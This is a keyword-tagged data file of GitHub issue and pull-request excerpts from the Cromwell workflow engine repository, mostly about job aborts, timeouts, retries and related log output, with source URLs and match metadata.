Safety,A quick conflict resolve in IntellIJ took care of things very nicely. A sanity check is that the parser on this branch contains references to both `$call_brace_block` and `(?<!\\\\)`,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4789#issuecomment-479662249:72,sanity check,sanity check,72,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4789#issuecomment-479662249,1,['sanity check'],['sanity check']
Safety,"A recent review of Travis test failures revealed that some workflows were failing due to timeouts on functions like read_lines() or read_int() timing out:. ```cromwell.backend.standard.StandardAsyncExecutionActor$$anon$2: Failed to evaluate job outputs:; Bad output 'int_reader.int': Failed to read_int(""""gs://cloud-cromwell-dev/cromwell_execution/travis/globs/57f6e677-c2aa-4d96-bf33-9591fce20da7/call-int_reader/shard-3/stdout"""") (reason 1 of 1): Futures timed out after [10 seconds]; at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$handleExecutionSuccess$1(StandardAsyncExecutionActor.scala:851)```. It's possible that being queued in the I/O actor can take longer than the 10s timeout and thus that is the issue. It's possible this timeout needs to be raised or output evaluation needs to be retried, but this needs a fix as the outputs being evaluated already exist, so this is a bad failure mode. AC: Depending on the potential causes for such behavior, either retry this evaluation, raise the timeout or explore another solution to ensure that jobs dont fail because of this timeout.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057:89,timeout,timeouts,89,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057,5,['timeout'],"['timeout', 'timeouts']"
Safety,"A significant amount of GotC failures are due to out of memory / disk errors.; Design a mechanism that allow to specify custom retry strategies that can modify runtime parameters based on failure modes. For example, “Retry on return code X with double the amount of memory and / or disk”. Thoughts:; - `currentAttempt()` wdl function to be used as a variable in a memory / disk formula; - monitor the job (monitoring script ?) to detect disk / memory overflows.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1847:430,detect,detect,430,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1847,1,['detect'],['detect']
Safety,A strict version of `mapValues` that avoids the nasty surprises of the original.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3943:37,avoid,avoids,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3943,1,['avoid'],['avoids']
Safety,"A user is reporting the failure message ""the job was aborted from outside Cromwell"". Looking at the Operation details:; ```; ""error"": {; ""code"": 1,; ""details"": [],; ""message"": ""Operation canceled at 2018-08-08T21:05:00-07:00 because it is older than 6 days""; },; ```. Can Cromwell inspect the Operation for this condition and produce a friendlier error message?. Operation `operations/EK3uv-_PLBjok8Wbqs77lCUgq92AiSQqD3Byb2R1Y3Rpb25RdWV1ZQ`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2496#issuecomment-412133698:53,abort,aborted,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2496#issuecomment-412133698,1,['abort'],['aborted']
Safety,A very quick peek in the Rawls db for workflows still in Aborting gives me 92. The earliest one is from February so I'd _guess_ this is still a problem.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1976#issuecomment-327941555:57,Abort,Aborting,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1976#issuecomment-327941555,1,['Abort'],['Aborting']
Safety,AC: Investigate the root cause of why the abort endpoint occasionally returns a 404 in production.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4767#issuecomment-475637417:42,abort,abort,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4767#issuecomment-475637417,1,['abort'],['abort']
Safety,"AWS backend ""aborts"" inappropriately with large files",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4960:13,abort,aborts,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4960,1,['abort'],['aborts']
Safety,Abort Local with docker kills the script but not the docker container,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1126:0,Abort,Abort,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1126,1,['Abort'],['Abort']
Safety,Abort aborts workflow but not jobs,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:0,Abort,Abort,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,2,"['Abort', 'abort']","['Abort', 'aborts']"
Safety,Abort all connected up. Closes #1253,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1397:0,Abort,Abort,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1397,1,['Abort'],['Abort']
Safety,Abort harder,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2829:0,Abort,Abort,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2829,1,['Abort'],['Abort']
Safety,"Abort is broken, it is true. Closing this issue in favor of tracking all the Abort-related work in the [Google Doc](https://docs.google.com/document/d/1B0FElJXOp4IP-v24C62CLsC0JQMbQPjaIrjOwnDqko8/edit).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1396#issuecomment-324467643:0,Abort,Abort,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1396#issuecomment-324467643,2,['Abort'],"['Abort', 'Abort-related']"
Safety,Abort is definitely not idempotent; I don't think it would be appropriate to make this a GET.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2318#issuecomment-305813608:0,Abort,Abort,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2318#issuecomment-305813608,1,['Abort'],['Abort']
Safety,Abort more,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3069:0,Abort,Abort,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3069,1,['Abort'],['Abort']
Safety,Abort sub workflows,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3260:0,Abort,Abort,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3260,1,['Abort'],['Abort']
Safety,Abort support for JES PBE,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/753:0,Abort,Abort,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/753,1,['Abort'],['Abort']
Safety,Abort support for Local PBE,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/672:0,Abort,Abort,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/672,1,['Abort'],['Abort']
Safety,"Abort was just failing everything, this fixes it.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/379:0,Abort,Abort,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/379,1,['Abort'],['Abort']
Safety,Abort wiring in shadow world. Closes #671,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/759:0,Abort,Abort,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/759,1,['Abort'],['Abort']
Safety,Abort with JES has race conditions,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/700:0,Abort,Abort,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/700,1,['Abort'],['Abort']
Safety,Aborted jobs still submits additional preemtible tasks to JES,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3758:0,Abort,Aborted,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3758,1,['Abort'],['Aborted']
Safety,AbortedResponse handler in WorkflowExecutionActor seems superfluous,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1376:0,Abort,AbortedResponse,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1376,1,['Abort'],['AbortedResponse']
Safety,"Aborting 1 EJEAs; 2016-12-12 18:34:40,026 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(3206b2df)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:35:03,235 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(63064089)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:13,509 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(812336d3)]: Abort received. Aborting 14 EJEAs; 2016-12-12 18:35:23,568 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(197caaf2)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:35:36,241 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(98068011)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:35:46,427 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(b5d75f00)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:56,417 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(0891d5a0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:05,640 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(51571dc0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:15,513 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(c43b628c)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:36:24,633 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(50785284)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:36:34,764 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(8dd2fe57)]: Abort received. Aborting 2 EJEAs; 2016-12-12 18:36:45,132 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(7f1250f8)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:37:06,029 cromwell-system-akka.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:3873,Abort,Aborting,3873,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Aborting']
Safety,"Aborting 1 EJEAs; 2016-12-12 18:35:03,235 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(63064089)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:13,509 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(812336d3)]: Abort received. Aborting 14 EJEAs; 2016-12-12 18:35:23,568 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(197caaf2)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:35:36,241 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(98068011)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:35:46,427 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(b5d75f00)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:56,417 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(0891d5a0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:05,640 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(51571dc0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:15,513 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(c43b628c)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:36:24,633 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(50785284)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:36:34,764 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(8dd2fe57)]: Abort received. Aborting 2 EJEAs; 2016-12-12 18:36:45,132 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(7f1250f8)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:37:06,029 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(3d36fdc3)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:37:14,145 cromwell-system-akka.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:4034,Abort,Aborting,4034,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Aborting']
Safety,"Aborting 6 EJEAs; 2016-12-12 18:35:13,509 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(812336d3)]: Abort received. Aborting 14 EJEAs; 2016-12-12 18:35:23,568 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(197caaf2)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:35:36,241 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(98068011)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:35:46,427 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(b5d75f00)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:56,417 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(0891d5a0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:05,640 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(51571dc0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:15,513 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(c43b628c)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:36:24,633 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(50785284)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:36:34,764 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(8dd2fe57)]: Abort received. Aborting 2 EJEAs; 2016-12-12 18:36:45,132 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(7f1250f8)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:37:06,029 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(3d36fdc3)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:37:14,145 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(60ec6228)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:37:23,720 cromwell-system-akka.d",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:4196,Abort,Aborting,4196,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Aborting']
Safety,"Aborting 7 EJEAs; 2016-12-12 18:34:16,741 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(28d5b663)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:28,999 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(7c8b62e6)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:40,026 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(3206b2df)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:35:03,235 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(63064089)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:13,509 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(812336d3)]: Abort received. Aborting 14 EJEAs; 2016-12-12 18:35:23,568 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(197caaf2)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:35:36,241 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(98068011)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:35:46,427 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(b5d75f00)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:56,417 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(0891d5a0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:05,640 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(51571dc0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:15,513 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(c43b628c)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:36:24,633 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(50785284)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:36:34,764 cromwell-system-akka",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:3550,Abort,Aborting,3550,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Aborting']
Safety,"Aborting 7 EJEAs; 2016-12-12 18:35:36,241 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(98068011)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:35:46,427 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(b5d75f00)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:56,417 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(0891d5a0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:05,640 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(51571dc0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:15,513 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(c43b628c)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:36:24,633 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(50785284)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:36:34,764 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(8dd2fe57)]: Abort received. Aborting 2 EJEAs; 2016-12-12 18:36:45,132 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(7f1250f8)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:37:06,029 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(3d36fdc3)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:37:14,145 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(60ec6228)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:37:23,720 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(a442dc1c)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:37:31,421 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(17bed42e)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:37:40,098 cromwell-system-akka.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:4519,Abort,Aborting,4519,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Aborting']
Safety,"Aborting 9 EJEAs; 2016-12-12 18:34:05,494 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(44318e55)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:34:16,741 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(28d5b663)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:28,999 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(7c8b62e6)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:40,026 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(3206b2df)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:35:03,235 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(63064089)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:13,509 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(812336d3)]: Abort received. Aborting 14 EJEAs; 2016-12-12 18:35:23,568 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(197caaf2)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:35:36,241 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(98068011)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:35:46,427 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(b5d75f00)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:56,417 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(0891d5a0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:05,640 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(51571dc0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:15,513 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(c43b628c)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:36:24,633 cromwell-system-akka",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:3388,Abort,Aborting,3388,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Aborting']
Safety,Aborts jobs on shutdown.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/397:0,Abort,Aborts,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/397,1,['Abort'],['Aborts']
Safety,Aborts v2,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2808:0,Abort,Aborts,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2808,1,['Abort'],['Aborts']
Safety,Actual code:. ``` scala; override def abortInitialization(): Unit = ???; ```,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1109:38,abort,abortInitialization,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1109,3,['abort'],['abortInitialization']
Safety,"Actually... @aednichols has some ""run a single workflow mode"" tests - it might be nice to add this situation to those so we can avoid any regressions here. Does that sounds feasible to you Adam (or is it a much bigger change)?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5236#issuecomment-543828698:128,avoid,avoid,128,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5236#issuecomment-543828698,1,['avoid'],['avoid']
Safety,Add Recover to Backend Actor,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/663:4,Recover,Recover,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/663,1,['Recover'],['Recover']
Safety,"Add Trivy github action and remediate [BW-466, BW-476]",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6152:28,remediat,remediate,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6152,1,['remediat'],['remediate']
Safety,Add ability to abort on-hold workflows,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4311:15,abort,abort,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4311,1,['abort'],['abort']
Safety,Add abort by label,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2333:4,abort,abort,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2333,1,['abort'],['abort']
Safety,Add abort support in HtCondor,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1402:4,abort,abort,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1402,1,['abort'],['abort']
Safety,"Add abort, workflow store delete to coordinated access actor [WA-334]",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906:4,abort,abort,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906,1,['abort'],['abort']
Safety,Add akka http request-timeout idle-timeout examples in the config; To allow users to get metadata results from large workflows. Also delete the now duplicated cromwell.examples.conf file; And delete the backends section which has been split into; separate files. https://gatkforums.broadinstitute.org/wdl/discussion/10209/retrieving-metadata-for-large-workflows. https://github.com/broadinstitute/cromwell/issues/2519,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4776:22,timeout,timeout,22,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4776,2,['timeout'],['timeout']
Safety,Add an abort test with subworkflows when they're back,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2815:7,abort,abort,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2815,1,['abort'],['abort']
Safety,Add default logback.xml to womtool to avoid spammy netty logs [BA-6580],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5794:38,avoid,avoid,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5794,1,['avoid'],['avoid']
Safety,Add example akka config to avoid metadata timeout issue,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4776:27,avoid,avoid,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4776,2,"['avoid', 'timeout']","['avoid', 'timeout']"
Safety,Add flatten type detection,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2959:17,detect,detection,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2959,1,['detect'],['detection']
Safety,Add recovery / abort to HtCondorBackend,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/885:4,recover,recovery,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/885,2,"['abort', 'recover']","['abort', 'recovery']"
Safety,Add retry on abort option,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4205:13,abort,abort,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4205,1,['abort'],['abort']
Safety,"Add safety net around expression ""toString""ing for missing expressions [BA-5950]",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5197:4,safe,safety,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5197,1,['safe'],['safety']
Safety,Add test timeouts to more quickly fail everlasting tests,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5937:9,timeout,timeouts,9,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5937,1,['timeout'],['timeouts']
Safety,Add tests for aborts,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2088:14,abort,aborts,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2088,1,['abort'],['aborts']
